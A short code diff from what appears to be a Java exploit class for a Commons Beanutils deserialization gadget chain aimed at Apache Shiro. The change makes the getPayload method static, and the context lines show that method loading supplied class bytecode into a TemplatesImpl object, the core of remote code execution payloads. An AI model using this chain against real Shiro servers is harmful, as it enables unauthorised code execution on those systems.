@@ -16,7 +16,7 @@ public class CommonsBeanutils1Shiro {
         field.set(obj, value);
     }
 
-    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+    public static byte[] getPayload(byte[] clazzBytes) throws Exception {
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
         setFieldValue(obj, "_name", "HelloTemplatesImpl");
